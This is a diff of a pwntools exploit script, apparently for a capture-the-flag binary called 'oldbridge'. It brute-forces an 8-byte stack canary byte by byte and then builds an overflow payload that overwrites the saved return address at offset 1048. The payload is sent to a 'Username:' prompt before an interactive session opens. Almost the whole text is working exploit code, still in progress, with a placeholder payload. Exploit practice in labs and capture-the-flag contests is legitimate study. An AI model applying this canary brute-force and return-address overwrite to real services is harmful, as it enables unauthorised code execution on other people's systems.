@@ -42,7 +42,7 @@ def start(argv=[], *a, **kw):
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
 gdbscript = '''
-break *0x{exe.symbols.main:x}
+set follow-fork-mode child
 continue
 '''.format(**locals())
 
@@ -56,6 +56,7 @@ continue
 # PIE:      PIE enabled
 
 # create session
+context.terminal = ['xfce4-terminal', '-e']
 config = {}
 create_session("oldbridge", args.LOCAL)
 
@@ -86,7 +87,7 @@ def check_server(data, padding = False):
 
 def brute_force_cookie(logging = False):
     cookie = ""
-    for y in range(4):
+    for y in range(8):
         if logging:
             log.info("Bruteforcing byte {}".format(y + 1))
         for x in range(0x100):
@@ -103,7 +104,7 @@ def brute_force_cookie(logging = False):
                 break
 
     if logging:
-        if len(cookie) == 4:
+        if len(cookie) == 8:
             log.success("Got cookie: " + cookie)
         else:
             log.error("Cookie not found")
@@ -118,13 +119,32 @@ if args.LOAD:
 if 'cookie' not in config:
     config['cookie'] = brute_force_cookie(logging = True)
 
-def craft(data):
-    return config['username'] + cyclic(config['buf_size'] - len(config['username'])) + config['cookie'] + data
+config['rip_off'] = 1048
+def craft_rip_overwrite(data):
+    user_cookie_pad = config['buf_size'] - len(config['username'])
+    cookie_rip_pad = config['rip_off'] - user_cookie_pad - \
+                     len(config['username']) - len(config['cookie'])
+
+    to_send = config['username'] + \
+           cyclic(user_cookie_pad) + \
+           config['cookie'] + \
+           cyclic(cookie_rip_pad) + \
+           data
+
+    print (to_send, len(to_send))
+    return to_send
+
+
+#alive = check_server(config['cookie'], padding = True)
+#if not alive:
+#    log.error("Stack cookie is wrong")
 
 io = start()
-io.sendafter("Username: ", craft(cyclic(0)))
-data_recv = io.clean()
-print (data_recv)
-
+config['check_username_off'] = 0x0B6F
+#payload = craft_rip_overwrite(p64(config['check_username_off'])[:2])
+payload = craft_rip_overwrite("AAAAAAAA")
+log.info("Payload")
+io.sendafter("Username: ", payload)
+io.interactive()
 # save the session
 save_vars(config)
